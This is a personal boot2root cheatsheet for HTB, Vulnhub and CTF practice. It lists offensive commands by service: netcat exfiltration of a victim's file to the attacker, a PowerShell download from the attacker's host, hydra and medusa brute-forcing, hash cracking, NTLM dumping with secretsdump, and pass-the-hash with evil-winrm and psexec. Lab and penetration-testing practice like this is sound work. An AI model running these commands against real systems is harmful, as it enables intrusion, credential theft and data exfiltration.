# Boot2Root cheatsheet

> personal cheathsheet populated via my [HTB](https://www.hackthebox.eu/), [Vulnhub](https://www.vulnhub.com/) and CTF experience.

## Summary

1. [Common tasks](#common-tasks)
2. [Common services/ports](#common-servicesports)
3. [Windows](#windows)
4. [Linux](#linux)

___

## Common tasks

- Spawning TTY Shell: `python -c 'import pty; pty.spawn("/bin/bash")'`
- Running an HTTP Server: `python3 -m http.server`
- Password "cracking": `hashcat -m $ATTACK_MODE $FILE /usr/share/wordlists/rockyou.txt`
- Transfering file using **netcat**:	
	+ Attacker's machine:
	```bash
	$ nc -l -p $LPORT  > $RFILE < /dev/null
	^C
	```
	+ Victim's machine:
	```bash
	$ cat $LFILE | nc $RHOST $RPORT
	```

## Common services/ports

### Port 21 (FTP)

`ftp $TARGET`

- [ ] Check if you can log in as `annonymous`

### Port 22 (SSH)

- Connect to remote server with private key: `ssh -i $KEY_FILE $USER@$TARGET`
- Fix common key exchange issue: `ssh -oKexAlgorithms=+diffie-hellman-group1-sha1`
- Port forwarding: `ssh -L $LPORT:$TARGET:$RPORT $USER@$TARGET`

- **SCP**:
	+ Copy a local file to a remote host: `scp $LFILE $USER@$TARGET:$RFILE`
	+ Copy a file from a remote host to a local directory: `scp $USER@$TARGET:$RFILE $LDIR`
	
#### Bruteforce

- Bruteforce private key:

```bash
$ /usr/share/john/ssh2john.py id_rsa.bak > $USER.john
$ john $USER.john --wordlist=/usr/share/wordlists/rockyou.txt
```

- Bruteforce connection:
	+ **medusa**: `medusa -h $TARGET -U $USER_WORDLIST -P $PASSWORD_WORDLIST -M ssh`
	+ **hydra**: `hydra -L $USER_WORDLIST -P $PASSWORD_WORDLIST $TARGET ssh`

### Port 53 (DNS)

- DNS Zone transfer: `$ dig axfr @$TARGET [domain]`

### Port 79 (Finger)

- [Pentestmonkey script]() :`./finger-user-enum.pl -U $USERNAME_WORDLIST -t $TARGET`
- Metasploit module: `use auxiliary/scanner/finger/finger_users`

> [Hacktricks - pentesting finger](https://book.hacktricks.xyz/pentesting/pentesting-finger)

### Port 80/443 (HTTP/HTTPS)

1. Looking for "hidden" directories/files:

```bash
# dirb
$ dirb http://$IP -o dirb.txt

# gobuster
$ gobuster dir -u http://$IP -w /usr/share/dirb/wordlists/common.txt -o gobuster.txt
```

- specific extension: 

```bash
# dirb
$ dirb http://$IP -X .<extension> -o dirb.txt

# gobuster
$ gobuster dir -u http://$IP -w /usr/share/dirb/wordlists/common.txt -x .<ext(s)> -o gobuster.txt
```

- ignore SSL error (gobuster): `gobuster dir -u https://$IP -w /usr/share/dirb/wordlists/common.txt -o gobuster.txt -k`
	
2. Looking for subdmains:

`gobuster dns -d $DOMAIN -w $WORDLIST`

3. Bruteforce GET/POST
	- POST request: `hydra [-L $USER_LIST|-l $USERNAME] [-P $PASSWORD_LIST|-p $PASSWORD] $TARGET http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'` (**WordPress** example)
		+ `/wp-login.php` has to be replace by `action` value in form
		+ `log` & `pwd` can be `username` & `password` (it depends on the name attributes values in form)
		+ `wp-submit=Log+In` &rarr; text value of the submit button
		+ `F=Invalid username` &rarr; failure message
	- GET request:
	
		> TODO...

4. Vulnerability scan:
	- generic: `nikto -h $TARGET`
	- WordPress: `wpscan --url http://$TARGET`

### Port 139/445 (SMB - Samba)

- Listing directories: `smbclient -L //<IP>/<Sharename> -U "username%password"`
- (Recursive search) Listing directories and permissions: `smbmap -H $TARGET -R | tee smbmap.txt`
- "Manual" bruteforce: `for u in $(cat usernames.txt); do echo "User: $u"; smbclient -L //<IP>/ -U "$u%$u"; done`

### Port 389 (LDAP)

- `ldapsearch -h <IP> -x -s base namingcontexts` 
- `ldapsearch -h <IP> -x -b "<distinguishedName>" | grep "^dn"`

___

## Windows

- [VbScrub - Tutorials](https://www.youtube.com/playlist?list=PL3B8L-z5QU-Yw80HOGXXUASBfv_K1WwO5)

### Tools

- [nishang](https://github.com/samratashok/nishang): collection of scripts and payloads which enables usage of PowerShell for offensive security
- [dnSpy](https://github.com/0xd4d/dnSpy#dnspy---latest-release---%EF%B8%8F-donate): debugger and .NET assembly editor.
- [BloodHound](https://github.com/BloodHoundAD/Bloodhound/wiki): reveal the hidden and often unintended relationships within an Active Directory environment. 

### Downloading files (alternative to `wget`)

> `c:\Windows\System32\spool\drivers\color\` is a world-writeable directory.

```powershell
powershell -command "(new-object System.Net.WebClient).DownloadFile('http://$IP:$PORT/$FILE', 'c:\Windows\System32\spool\drivers\color\$FILE')"
```

### Shell

`gem install evil-winrm`

- `evil-winrm -i <ip> -u <username> -p <password>`
- PassTheHash: `evil-winrm -i <ip> -u <username> -H <NTLM_HASH>`

```powershell
*Evil-WinRM* PS C:\> NET USER # list users
```

### Kerberos

- `python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py <distinguishedName>/<username> -request -dc-ip <IP> [-no-pass -usersfile users.txt]`
- Kerberos 5 AS-REP etype 23 `hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`. See [hashcat wiki](https://hashcat.net/wiki/doku.php?id=hashcat) and [**hackndo** - kerberos as-rep roasting (fr)](https://beta.hackndo.com/kerberos-asrep-roasting/)

### Privesc

> _`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`_

1. `python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc-ntlm <domainName>/<admin-user>@<IP>`
2. `python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes <NTLMhash> administrator@<IP> cmd.exe`

### Port 135 (RPC)

```bash
rpcclient -U "" $IP
<empty password>
rpcclient $> srvinfo       # identify the specific OS version
rpcclient $> enumdomusers  # display a list of users names defined on the server
rpcclient $> getdompwinfo  # get SMB password policy
rpcclient $> querydispinfo # get users info
```

### Post-exploitation

#### Tools

- [LOLBAS](https://lolbas-project.github.io/#)
	+ [GTFOBLookup](https://github.com/nccgroup/GTFOBLookup): offline command line lookup utility
- [PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite#peass---privilege-escalation-awesome-scripts-suite)
	+ [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
- [wesng](https://github.com/bitsadmin/wesng): Windows Exploit Suggester - Next Generation (WES-NG)
- [Watson](https://github.com/rasta-mouse/Watson#watson): enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities
- [mimikatz](https://github.com/gentilkiwi/mimikatz#mimikatz)
<!--
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit): PowerShell Post-Exploitation Framework
- [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
-->
___

## Linux

`sudo -l`

> **TODO**...

### Post-exploitation

- [GTFOBins](https://gtfobins.github.io/)
- [PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite#peass---privilege-escalation-awesome-scripts-suite)
	+ [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)